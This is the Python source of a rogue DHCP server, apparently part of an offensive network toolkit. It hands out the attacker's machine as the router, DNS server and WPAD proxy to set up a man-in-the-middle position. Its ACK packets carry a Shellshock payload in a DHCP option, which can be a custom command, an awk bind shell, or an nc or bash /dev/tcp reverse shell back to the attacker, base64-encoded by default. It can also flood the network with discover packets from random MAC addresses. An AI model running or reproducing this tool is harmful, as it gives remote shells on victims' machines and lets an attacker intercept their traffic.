#!/usr/bin/env python

# region Import
from sys import path
from os.path import dirname, abspath
project_root_path = dirname(dirname(dirname(abspath(__file__))))
utils_path = project_root_path + "/Utils/"
path.append(utils_path)

from base import Base
from network import Ethernet_raw, ARP_raw, IP_raw, DHCP_raw
from sys import exit
from argparse import ArgumentParser
from ipaddress import IPv4Address
from scapy.all import Ether, ARP, BOOTP, DHCP, sniff
from socket import socket, AF_PACKET, SOCK_RAW, inet_aton
from base64 import b64encode
from struct import pack
from netaddr import IPAddress
from tm import ThreadManager
from time import sleep
from random import randint
# endregion

# region Check user, platform and create threads
Base = Base()
Base.check_user()
Base.check_platform()
tm = ThreadManager(3)
# endregion

# region Parse script arguments
parser = ArgumentParser(description='DHCP Rogue server')

parser.add_argument('-i', '--interface', help='Set interface name for send reply packets')

parser.add_argument('-f', '--first_offer_ip', type=str, help='Set first client ip for offering', default=None)
parser.add_argument('-l', '--last_offer_ip', type=str, help='Set last client ip for offering', default=None)
parser.add_argument('-t', '--target_mac', type=str, help='Set target MAC address', default=None)
parser.add_argument('-I', '--target_ip', type=str, help='Set client IP address with MAC in --target_mac', default=None)
parser.add_argument('-m', '--netmask', type=str, help='Set network mask', default=None)

parser.add_argument('--dhcp_mac', type=str, help='Set DHCP server MAC address, if not set use your MAC address', default=None)
parser.add_argument('--dhcp_ip', type=str, help='Set DHCP server IP address, if not set use your IP address', default=None)

parser.add_argument('--router', type=str, help='Set router IP address, if not set use your ip address', default=None)
parser.add_argument('--dns', type=str, help='Set DNS server IP address, if not set use your ip address', default=None)
parser.add_argument('--tftp', type=str, help='Set TFTP server IP address', default=None)
parser.add_argument('--proxy', type=str, help='Set Proxy URL', default=None)

parser.add_argument('-s', '--send_discover', action='store_true',
                    help='Send DHCP discover packets in the background thread')
parser.add_argument('-r', '--discover_rand_mac', action='store_true',
                    help='Use random MAC address for source MAC address in DHCP discover packets')
parser.add_argument('-d', '--discover_delay', type=float,
                    help='Set delay between DHCP discover packets (default=0.5 sec.)', default=0.5)

parser.add_argument('-O', '--shellshock_option_code', type=int,
                    help='Set dhcp option code for inject shellshock payload, default=114', default=114)
parser.add_argument('-c', '--shellshock_command', type=str, help='Set shellshock command in DHCP client')
parser.add_argument('-b', '--bind_shell', action='store_true', help='Use awk bind tcp shell in DHCP client')
parser.add_argument('-p', '--bind_port', type=int, help='Set port for listen bind shell (default=1234)', default=1234)
parser.add_argument('-N', '--nc_reverse_shell', action='store_true', help='Use nc reverse tcp shell in DHCP client')
parser.add_argument('-E', '--nce_reverse_shell', action='store_true', help='Use nc -e reverse tcp shell in DHCP client')
parser.add_argument('-R', '--bash_reverse_shell', action='store_true', help='Use bash reverse tcp shell in DHCP client')
parser.add_argument('-e', '--reverse_port', type=int, help='Set port for listen bind shell (default=443)', default=443)
parser.add_argument('-n', '--without_network', action='store_true', help='Do not add network configure in payload')
parser.add_argument('-B', '--without_base64', action='store_true', help='Do not use base64 encode in payload')
parser.add_argument('--ip_path', type=str,
                    help='Set path to "ip" in shellshock payload, default = /bin/', default="/bin/")
parser.add_argument('--iface_name', type=str,
                    help='Set iface name in shellshock payload, default = eth0', default="eth0")

parser.add_argument('--broadcast_response', action='store_true', help='Send broadcast response')
parser.add_argument('--exit', action='store_true', help='Exit on success MiTM attack')
parser.add_argument('--lease_time', type=int, help='Set lease time, default=172800', default=172800)
parser.add_argument('--domain', type=str, help='Set domain name for search, default=local', default="local")

parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')

args = parser.parse_args()
# endregion

# region Print banner if argument quit is not set
if not args.quiet:
    Base.print_banner()
# endregion

# region Set global variables

eth = Ethernet_raw()
arp = ARP_raw()
dhcp = DHCP_raw()

current_network_interface = None
first_offer_ip_address = None
last_offer_ip_address = None
network_mask = None

target_mac_address = None
target_ip_address = None

dhcp_server_mac_address = None
dhcp_server_ip_address = None

router_ip_address = None
dns_server_ip_address = None
tftp_server_ip_address = None
proxy_url = None

dhcp_discover_packets_source_mac = None

free_ip_addresses = []
clients = {}

shellshock_url = None
domain = None
payload = None

SOCK = None
# endregion

# region Get your network settings
if args.interface is None:
    current_network_interface = Base.netiface_selection()
else:
    current_network_interface = args.interface

your_mac_address = Base.get_netiface_mac_address(current_network_interface)
if your_mac_address is None:
    Base.print_error("Network interface: ", current_network_interface, " do not have MAC address!")
    exit(1)

your_ip_address = Base.get_netiface_ip_address(current_network_interface)
if your_ip_address is None:
    Base.print_error("Network interface: ", current_network_interface, " do not have IP address!")
    exit(1)

your_network_mask = Base.get_netiface_netmask(current_network_interface)
if your_network_mask is None:
    Base.print_error("Network interface: ", current_network_interface, " do not have network mask!")
    exit(1)

if args.netmask is None:
    network_mask = your_network_mask
else:
    network_mask = args.netmask
# endregion

# region Create raw socket
SOCK = socket(AF_PACKET, SOCK_RAW)
SOCK.bind((current_network_interface, 0))
# endregion

# region Get first and last IP address in your network
first_ip_address = str(IPv4Address(unicode(Base.get_netiface_first_ip(current_network_interface))) - 1)
last_ip_address = str(IPv4Address(unicode(Base.get_netiface_last_ip(current_network_interface))) + 1)
# endregion

# region Set target MAC and IP address, if target IP is not set - get first and last offer IP
if args.target_mac is not None:
    target_mac_address = str(args.target_mac).lower()

# region Target IP is set
if args.target_ip is not None:
    if args.target_mac is not None:
        if not Base.ip_address_in_range(args.target_ip, first_ip_address, last_ip_address):
            Base.print_error("Bad value `-I, --target_ip`: ", args.target_ip,
                             "; target IP address must be in range: ", first_ip_address + " - " + last_ip_address)
            exit(1)
        else:
            target_ip_address = args.target_ip
    else:
        Base.print_error("Please set target MAC address (example: --target_mac 00:AA:BB:CC:DD:FF)" +
                         ", for target IP address: ", args.target_ip)
        exit(1)
# endregion

# region Target IP is not set - get first and last offer IP
else:
    # Check first offer IP address
    if args.first_offer_ip is None:
        first_offer_ip_address = str(IPv4Address(unicode(first_ip_address)) + 1)
    else:
        if not Base.ip_address_in_range(args.first_offer_ip, first_ip_address, last_ip_address):
            Base.print_error("Bad value `-f, --first_offer_ip`: ", args.first_offer_ip,
                             "; first IP address in your network: ", first_ip_address)
            exit(1)
        else:
            first_offer_ip_address = args.first_offer_ip

    # Check last offer IP address
    if args.last_offer_ip is None:
        last_offer_ip_address = str(IPv4Address(unicode(last_ip_address)) - 1)
    else:
        if not Base.ip_address_in_range(args.last_offer_ip, first_ip_address, last_ip_address):
            Base.print_error("Bad value `-l, --last_offer_ip`: ", args.last_offer_ip,
                             "; last IP address in your network: ", last_ip_address)
            exit(1)
        else:
            last_offer_ip_address = args.last_offer_ip

# endregion

# endregion

# region Set DHCP sever MAC and IP address
if args.dhcp_mac is None:
    dhcp_server_mac_address = your_mac_address
else:
    dhcp_server_mac_address = args.dhcp_mac

if args.dhcp_ip is None:
    dhcp_server_ip_address = your_ip_address
else:
    if not Base.ip_address_in_range(args.dhcp_ip, first_ip_address, last_ip_address):
        Base.print_error("Bad value `--dhcp_ip`: ", args.dhcp_ip,
                         "; DHCP server IP address must be in range: ", first_ip_address + " - " + last_ip_address)
        exit(1)
    else:
        dhcp_server_ip_address = args.dhcp_ip
# endregion

# region Set router, dns, tftp IP address and proxy url

# Set router IP address
if args.router is None:
    router_ip_address = your_ip_address
else:
    if not Base.ip_address_in_range(args.router, first_ip_address, last_ip_address):
        Base.print_error("Bad value `--router`: ", args.router,
                         "; Router IP address must be in range: ", first_ip_address + " - " + last_ip_address)
        exit(1)
    else:
        router_ip_address = args.router

# Set DNS server IP address
if args.dns is None:
    dns_server_ip_address = your_ip_address
else:
    if not Base.ip_address_in_range(args.dns, first_ip_address, last_ip_address):
        Base.print_error("Bad value `--dns`: ", args.dns,
                         "; DNS server IP address must be in range: ", first_ip_address + " - " + last_ip_address)
        exit(1)
    else:
        dns_server_ip_address = args.dns

# Set TFTP server IP address
if args.tftp is None:
    tftp_server_ip_address = your_ip_address
else:
    if not Base.ip_address_in_range(args.tftp, first_ip_address, last_ip_address):
        Base.print_error("Bad value `--tftp`: ", args.tftp,
                         "; TFTP server IP address must be in range: ", first_ip_address + " - " + last_ip_address)
        exit(1)
    else:
        tftp_server_ip_address = args.tftp

# Set proxy url
if args.proxy is None:
    proxy_url = "http://" + your_ip_address + "/wpad.dat"
else:
    proxy_url = args.proxy

# endregion

# region Set Shellshock option code
if 255 < args.shellshock_option_code < 0:
    Base.print_error("Bad value: ", args.shellshock_option_code,
                     "in DHCP option code! This value should be in the range from 1 to 254")
    exit(1)
# endregion

# region Set search domain
domain = bytes(args.domain)
# endregion

# region General output
if not args.quiet:
    Base.print_info("Network interface: ", current_network_interface)
    Base.print_info("Your IP address: ", your_ip_address)
    Base.print_info("Your MAC address: ", your_mac_address)

    if target_mac_address is not None:
        Base.print_info("Target MAC: ", target_mac_address)

    # If target IP address is set print target IP, else print first and last offer IP
    if target_ip_address is not None:
        Base.print_info("Target IP: ", target_ip_address)
    else:
        Base.print_info("First offer IP: ", first_offer_ip_address)
        Base.print_info("Last offer IP: ", last_offer_ip_address)

    Base.print_info("DHCP server mac address: ", dhcp_server_mac_address)
    Base.print_info("DHCP server ip address: ", dhcp_server_ip_address)
    Base.print_info("Router IP address: ", router_ip_address)
    Base.print_info("DNS server IP address: ", dns_server_ip_address)
    Base.print_info("TFTP server IP address: ", tftp_server_ip_address)
    Base.print_info("Proxy url: ", proxy_url)
# endregion


# region Get free IP addresses in local network
def get_free_ip_addresses():
    # Get all IP addresses in range from first to last offer IP address
    current_ip_address = first_offer_ip_address
    while IPv4Address(unicode(current_ip_address)) <= IPv4Address(unicode(last_offer_ip_address)):
        free_ip_addresses.append(current_ip_address)
        current_ip_address = str(IPv4Address(unicode(current_ip_address)) + 1)
# endregion


# region Add client info in global clients dictionary
def add_client_info_in_dictionary(client_mac_address, client_info, this_client_already_in_dictionary=False):
    if this_client_already_in_dictionary:
        clients[client_mac_address].update(client_info)
    else:
        clients[client_mac_address] = client_info
# endregion


# region Make DHCP offer packet
def make_dhcp_offer_packet(transaction_id, offer_ip, client_mac, destination_mac=None, destination_ip=None):
    if destination_mac is None:
        destination_mac = "ff:ff:ff:ff:ff:ff"
    if destination_ip is None:
        destination_ip = "255.255.255.255"
    return dhcp.make_response_packet(source_mac=dhcp_server_mac_address,
                                     destination_mac=destination_mac,
                                     source_ip=dhcp_server_ip_address,
                                     destination_ip=destination_ip,
                                     transaction_id=transaction_id,
                                     your_ip=offer_ip,
                                     client_mac=client_mac,
                                     dhcp_server_id=dhcp_server_ip_address,
                                     lease_time=args.lease_time,
                                     netmask=network_mask,
                                     router=router_ip_address,
                                     dns=dns_server_ip_address,
                                     dhcp_operation=2,
                                     payload=None)
# endregion


# region Make DHCP ack packet
def make_dhcp_ack_packet(transaction_id, target_mac, target_ip, destination_mac=None, destination_ip=None):
    if destination_mac is None:
        destination_mac = "ff:ff:ff:ff:ff:ff"
    if destination_ip is None:
        destination_ip = "255.255.255.255"
    return dhcp.make_response_packet(source_mac=dhcp_server_mac_address,
                                     destination_mac=destination_mac,
                                     source_ip=dhcp_server_ip_address,
                                     destination_ip=destination_ip,
                                     transaction_id=transaction_id,
                                     your_ip=target_ip,
                                     client_mac=target_mac,
                                     dhcp_server_id=dhcp_server_ip_address,
                                     lease_time=args.lease_time,
                                     netmask=network_mask,
                                     router=router_ip_address,
                                     dns=dns_server_ip_address,
                                     dhcp_operation=5,
                                     payload=shellshock_url,
                                     proxy=bytes(proxy_url),
                                     domain=domain,
                                     tftp=tftp_server_ip_address,
                                     payload_option_code=args.shellshock_option_code)
# endregion


# region Make DHCP nak packet
def make_dhcp_nak_packet(transaction_id, requested_ip, target_ip):
    return dhcp.make_nak_packet(source_mac=dhcp_server_mac_address,
                                destination_mac=target_mac_address,
                                source_ip=dhcp_server_ip_address,
                                destination_ip=requested_ip,
                                transaction_id=transaction_id,
                                your_ip=target_ip,
                                client_mac=target_mac_address,
                                dhcp_server_id=dhcp_server_ip_address)
# endregion

# def ack_sender():
#     SOCK = socket(AF_PACKET, SOCK_RAW)
#     SOCK.bind((current_network_interface, 0))
#     ack_packet = make_dhcp_ack_packet(transaction_id_global, requested_ip_address)
#     while True:
#         SOCK.send(ack_packet)
#         sleep(0.01)


# region Send DHCP discover packets
def discover_sender():
    SOCK = socket(AF_PACKET, SOCK_RAW)
    SOCK.bind((current_network_interface, 0))

    if dhcp_discover_packets_source_mac != your_mac_address:
        relay_agent_ip_address = Base.get_netiface_random_ip(current_network_interface)
        while True:
            try:
                discover_packet = dhcp.make_discover_packet(source_mac=dhcp_discover_packets_source_mac,
                                                            client_mac=eth.get_random_mac(),
                                                            host_name=Base.make_random_string(8),
                                                            relay_ip=relay_agent_ip_address)
                SOCK.send(discover_packet)
                sleep(args.discover_delay)
            except:
                break

    else:
        while True:
            try:
                discover_packet = dhcp.make_discover_packet(source_mac=dhcp_discover_packets_source_mac,
                                                            client_mac=eth.get_random_mac(),
                                                            host_name=Base.make_random_string(8),
                                                            relay_ip=your_ip_address)
                SOCK.send(discover_packet)
                sleep(args.discover_delay)
            except:
                break

    SOCK.close()
    Base.print_error("Something went wrong when sending DHCP discover packets!")
# endregion


# region Reply to DHCP and ARP requests
def reply(request):
    # region Define global variables
    global SOCK
    global clients
    global target_ip_address
    global router_ip_address
    global payload
    global shellshock_url
    global args
    # endregion

    # region DHCP
    if request.haslayer(DHCP):

        # region Get transaction id and client MAC address
        transaction_id = request[BOOTP].xid
        client_mac_address = ":".join("{:02x}".format(ord(c)) for c in request[BOOTP].chaddr[0:6])
        # endregion

        # region Check this client already in dict
        client_already_in_dictionary = False
        if client_mac_address in clients.keys():
            client_already_in_dictionary = True
        # endregion

        # region DHCP DISCOVER
        if request[DHCP].options[0][1] == 1:
            Base.print_info("DHCP DISCOVER from: ", client_mac_address, " transaction id: ", hex(transaction_id))

            # If target IP address is set - offer IP = target IP
            if target_ip_address is not None:
                offer_ip_address = target_ip_address

            # If target IP address is not set - offer IP = random IP from free IP addresses list
            else:
                random_index = randint(0, len(free_ip_addresses))
                offer_ip_address = free_ip_addresses[random_index]

                # Delete offer IP from free IP addresses list
                del free_ip_addresses[random_index]

            if args.broadcast_response:
                offer_packet = make_dhcp_offer_packet(transaction_id, offer_ip_address, client_mac_address)
            else:
                offer_packet = make_dhcp_offer_packet(transaction_id, offer_ip_address, client_mac_address,
                                                      client_mac_address, offer_ip_address)

            SOCK.send(offer_packet)

            # Add client info in global clients dictionary
            add_client_info_in_dictionary(client_mac_address,
                                          {"transaction": transaction_id, "discover": True,
                                           "offer_ip": offer_ip_address},
                                          client_already_in_dictionary)
            # print clients

            Base.print_info("DHCP OFFER to: ", client_mac_address, " offer IP: ", offer_ip_address)
        # endregion

        # region DHCP RELEASE
        if request[DHCP].options[0][1] == 7:
            if request[BOOTP].ciaddr is not None:
                client_ip = request[BOOTP].ciaddr
                Base.print_info("DHCP RELEASE from: ", client_ip + " (" + client_mac_address + ")",
                                " transaction id: ", hex(transaction_id))

                # Add client info in global clients dictionary
                add_client_info_in_dictionary(client_mac_address,
                                              {"client_ip": client_ip},
                                              client_already_in_dictionary)
                # print clients

                # Add release client IP in free IP addresses list
                if client_ip not in free_ip_addresses:
                    free_ip_addresses.append(client_ip)
            else:
                Base.print_info("DHCP RELEASE from: ", client_mac_address, " transaction id: ", hex(transaction_id))

            # Add client info in global clients dictionary
            add_client_info_in_dictionary(client_mac_address,
                                          {"release": True},
                                          client_already_in_dictionary)
            # print clients
        # endregion

        # region DHCP INFORM
        if request[DHCP].options[0][1] == 8:
            if request[BOOTP].ciaddr is not None:
                client_ip = request[BOOTP].ciaddr
                Base.print_info("DHCP INFORM from: ", client_ip + " (" + client_mac_address + ")",
                                " transaction id: ", hex(transaction_id))

                # If client IP in free IP addresses list delete this
                if client_ip in free_ip_addresses:
                    free_ip_addresses.remove(client_ip)

                # Add client info in global clients dictionary
                add_client_info_in_dictionary(client_mac_address,
                                              {"client_ip": client_ip},
                                              client_already_in_dictionary)
                # print clients

            else:
                Base.print_info("DHCP INFORM from: ", client_mac_address, " transaction id: ", hex(transaction_id))

            # Add client info in global clients dictionary
            add_client_info_in_dictionary(client_mac_address,
                                          {"inform": True},
                                          client_already_in_dictionary)
            # print clients
        # endregion

        # region DHCP REQUEST
        if request[DHCP].options[0][1] == 3:
            # region Set local variables
            requested_ip = "0.0.0.0"
            offer_ip = None
            # endregion

            # region Get requested IP
            for option in request[DHCP].options:
                if option[0] == "requested_addr":
                    requested_ip = str(option[1])
            # endregion

            # region Print info message
            Base.print_info("DHCP REQUEST from: ", client_mac_address, " transaction id: ", hex(transaction_id),
                            " requested ip: ", requested_ip)
            # endregion

            # region Change client info in global clients dictionary

            # Add client info in global clients dictionary
            add_client_info_in_dictionary(client_mac_address,
                                          {"request": True, "requested_ip": requested_ip,
                                           "transaction": transaction_id},
                                          client_already_in_dictionary)

            # Delete ARP mitm success keys in dictionary for this client
            clients[client_mac_address].pop('client request his ip', None)
            clients[client_mac_address].pop('client request router ip', None)

            # endregion

            # region Get offer IP address
            try:
                offer_ip = clients[client_mac_address]["offer_ip"]
            except KeyError:
                pass
            # endregion

            # region This client already send DHCP DISCOVER and offer IP != requested IP
            if offer_ip is not None and offer_ip != requested_ip:
                # Print error message
                Base.print_error("Client: ", client_mac_address, " requested IP: ", requested_ip,
                                 " not like offer IP: ", offer_ip)

                # Create and send DHCP nak packet
                nak_packet = make_dhcp_nak_packet(transaction_id, requested_ip, offer_ip)
                SOCK.send(nak_packet)
                Base.print_info("DHCP NAK to: ", client_mac_address, " requested ip: ", requested_ip)

                # Add client info in global clients dictionary
                add_client_info_in_dictionary(client_mac_address,
                                              {"mitm": "error: offer ip not like requested ip", "offer_ip": None},
                                              client_already_in_dictionary)
                # print clients
            # endregion

            # region Offer IP == requested IP or this is a first request from this client
            else:

                # region Target IP address is set and requested IP != target IP
                if target_ip_address is not None and requested_ip != target_ip_address:

                    # Print error message
                    Base.print_error("Client: ", client_mac_address, " requested IP: ", requested_ip,
                                     " not like target IP: ", target_ip_address)

                    # Create and send DHCP nak packet
                    nak_packet = make_dhcp_nak_packet(transaction_id, requested_ip, target_ip_address)
                    SOCK.send(nak_packet)
                    Base.print_info("DHCP NAK to: ", client_mac_address, " requested ip: ", requested_ip)

                    # Add client info in global clients dictionary
                    add_client_info_in_dictionary(client_mac_address,
                                                  {"mitm": "error: target ip not like requested ip", "offer_ip": None,
                                                   "nak": True},
                                                  client_already_in_dictionary)

                # endregion

                # region Settings shellshock payload

                # region Create payload

                # Network settings command in target machine
                net_settings = args.ip_path + "ip addr add " + requested_ip + "/" + \
                               str(IPAddress(network_mask).netmask_bits()) + " dev " + args.iface_name + ";"

                # Shellshock payload: <user bash command>
                if args.shellshock_command is not None:
                    payload = args.shellshock_command

                # Shellshock payload:
                # awk 'BEGIN{s="/inet/tcp/<bind_port>/0/0";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &
                if args.bind_shell:
                    payload = "awk 'BEGIN{s=\"/inet/tcp/" + str(args.bind_port) + \
                              "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &"

                # Shellshock payload:
                # rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_ip> <your_port> >/tmp/f &
                if args.nc_reverse_shell:
                    payload = "rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
                              your_ip_address + " " + str(args.reverse_port) + " >/tmp/f &"

                # Shellshock payload:
                # /bin/nc -e /bin/sh <your_ip> <your_port> 2>&1 &
                if args.nce_reverse_shell:
                    payload = "/bin/nc -e /bin/sh " + your_ip_address + " " + str(args.reverse_port) + " 2>&1 &"

                # Shellshock payload:
                # /bin/bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1 &
                if args.bash_reverse_shell:
                    payload = "/bin/bash -i >& /dev/tcp/" + your_ip_address + \
                              "/" + str(args.reverse_port) + " 0>&1 &"

                if payload is not None:

                    # Do not add network settings command in payload
                    if not args.without_network:
                        payload = net_settings + payload

                    # Send payload to target in clear text
                    if args.without_base64:
                        shellshock_url = "() { :; }; " + payload

                    # Send base64 encoded payload to target in clear text
                    else:
                        payload = b64encode(payload)
                        shellshock_url = "() { :; }; /bin/sh <(/usr/bin/base64 -d <<< " + payload + ")"
                # endregion

                # region Check Shellshock payload length
                if shellshock_url is not None:
                    if len(shellshock_url) > 255:
                        Base.print_error("Length of shellshock payload is very big! Current length: ",
                                         str(len(shellshock_url)), " Maximum length: ", "254")
                        shellshock_url = "A"
                # endregion

                # endregion

                # region Send DHCP ack and print info message
                if args.broadcast_response:
                    ack_packet = make_dhcp_ack_packet(transaction_id, client_mac_address, requested_ip)
                else:
                    ack_packet = make_dhcp_ack_packet(transaction_id, client_mac_address, requested_ip,
                                                      client_mac_address, requested_ip)

                SOCK.send(ack_packet)

                Base.print_info("DHCP ACK to: ", client_mac_address, " requested ip: ", requested_ip)
                # endregion

                # region Add client info in global clients dictionary
                try:
                    clients[client_mac_address].update({"mitm": "success"})
                except KeyError:
                    clients[client_mac_address] = {"mitm": "success"}
                # endregion

        # endregion

        # region DHCP DECLINE
        if request[DHCP].options[0][1] == 4:
            # Get requested IP
            requested_ip = "0.0.0.0"
            for option in request[DHCP].options:
                if option[0] == "requested_addr":
                    requested_ip = str(option[1])

            # Print info message
            Base.print_info("DHCP DECLINE from: ", requested_ip + " (" + client_mac_address + ")",
                            " transaction id: ", hex(transaction_id))

            # If client IP in free IP addresses list delete this
            if requested_ip in free_ip_addresses:
                free_ip_addresses.remove(requested_ip)

            # Add client info in global clients dictionary
            add_client_info_in_dictionary(client_mac_address,
                                          {"decline_ip": requested_ip, "decline": True},
                                          client_already_in_dictionary)
            # print clients
        # endregion

    # endregion DHCP

    # region ARP
    if request.haslayer(ARP):
        if request[Ether].dst == "ff:ff:ff:ff:ff:ff" and request[ARP].hwdst == "00:00:00:00:00:00":
            # region Set local variables
            arp_sender_mac_address = request[ARP].hwsrc
            arp_sender_ip_address = request[ARP].psrc
            arp_target_ip_address = request[ARP].pdst
            # endregion

            # region Print info message
            Base.print_info("ARP request from: ", arp_sender_mac_address,
                            " \"", "Who has " + arp_target_ip_address + "? Tell " + arp_sender_ip_address, "\"")
            # endregion

            # region Get client mitm status
            try:
                mitm_status = clients[arp_sender_mac_address]["mitm"]
            except KeyError:
                mitm_status = ""
            # endregion

            # region Get client requested ip
            try:
                requested_ip = clients[arp_sender_mac_address]["requested_ip"]
            except KeyError:
                requested_ip = ""
            # endregion

            # region Create IPv4 address conflict
            if mitm_status.startswith("error"):
                arp_reply = arp.make_response(ethernet_src_mac=your_mac_address,
                                              ethernet_dst_mac=arp_sender_mac_address,
                                              sender_mac=your_mac_address, sender_ip=arp_target_ip_address,
                                              target_mac=arp_sender_mac_address, target_ip=arp_sender_ip_address)
                SOCK.send(arp_reply)
                Base.print_info("ARP response to:  ", arp_sender_mac_address,
                                " \"", arp_target_ip_address + " is at " + your_mac_address,
                                "\" (IPv4 address conflict)")
            # endregion

            # region MITM success
            if mitm_status.startswith("success"):

                if arp_target_ip_address == requested_ip:
                    clients[arp_sender_mac_address].update({"client request his ip": True})

                if arp_target_ip_address == router_ip_address:
                    clients[arp_sender_mac_address].update({"client request router ip": True})

                try:
                    test = clients[arp_sender_mac_address]["client request his ip"]
                    test = clients[arp_sender_mac_address]["client request router ip"]

                    try:
                        test = clients[arp_sender_mac_address]["success message"]
                    except KeyError:
                        Base.print_success("MITM success: ", requested_ip + " (" + arp_sender_mac_address + ")")
                        clients[arp_sender_mac_address].update({"success message": True})
                        if args.exit:
                            exit(0)

                except KeyError:
                    pass

            # endregion

    # endregion

# endregion


# region Main function
if __name__ == "__main__":

    # region Add ip addresses in list with free ip addresses from first to last offer IP
    if target_ip_address is None:
        Base.print_info("Create list with free IP addresses in your network ...")
        get_free_ip_addresses()
    # endregion

    # region Send DHCP discover packets in the background thread
    if args.send_discover:
        Base.print_info("Start DHCP discover packets send in the background thread ...")

        if args.discover_rand_mac:
            dhcp_discover_packets_source_mac = eth.get_random_mac()
            Base.print_info("DHCP discover packets Ethernet source MAC: ", dhcp_discover_packets_source_mac,
                            " (random MAC address)")
        else:
            dhcp_discover_packets_source_mac = your_mac_address
            Base.print_info("DHCP discover packets Ethernet source MAC: ", dhcp_discover_packets_source_mac,
                            " (your MAC address)")

        Base.print_info("Delay between DHCP discover packets: ", str(args.discover_delay))
        tm.add_task(discover_sender)
    # endregion

    # region Sniff network

    # Target MAC address is not set
    if target_mac_address is None:
        Base.print_info("Waiting for a ARP, DHCP DISCOVER, DHCP REQUEST or DHCP INFORM ...")

        # DHCP discover sender is not works
        if dhcp_discover_packets_source_mac is None:
            sniff(filter="arp or (udp and src port 68 and dst port 67)",
                  prn=reply, iface=current_network_interface)

        # DHCP discover sender is works, filter this packets
        else:
            sniff(lfilter=lambda d: d.src != dhcp_discover_packets_source_mac,
                  filter="arp or (udp and src port 68 and dst port 67)",
                  prn=reply, iface=current_network_interface)

    # Target MAC address is set
    else:
        Base.print_info("Waiting for a ARP, DHCP DISCOVER, DHCP REQUEST or DHCP INFORM from: ", target_mac_address)
        sniff(lfilter=lambda d: d.src == args.target_mac,
              filter="arp or (udp and src port 68 and dst port 67)",
              prn=reply, iface=current_network_interface)

    # endregion

# endregion
